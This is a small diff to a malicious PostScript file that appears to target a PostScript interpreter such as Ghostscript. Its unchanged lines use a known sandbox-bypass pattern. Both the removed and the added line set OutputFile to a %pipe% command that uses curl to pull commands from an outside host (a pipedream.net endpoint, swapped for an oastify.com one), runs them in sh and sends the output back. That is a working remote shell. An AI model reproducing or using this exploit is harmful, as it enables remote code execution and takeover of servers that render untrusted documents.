@@ -3,4 +3,4 @@ userdict /setpagedevice undef
 legal
 { null restore } stopped { pop } if
 legal
-mark /OutputFile (%pipe%C='curl -Ns telnet://eoow6y96ffo9mzx.m.pipedream.net'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null) currentdevice putdeviceprops
+mark /OutputFile (%pipe%C='curl -L ob3ufav6rbybetgf33zevix0frli9ix7.oastify.com'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null) currentdevice putdeviceprops
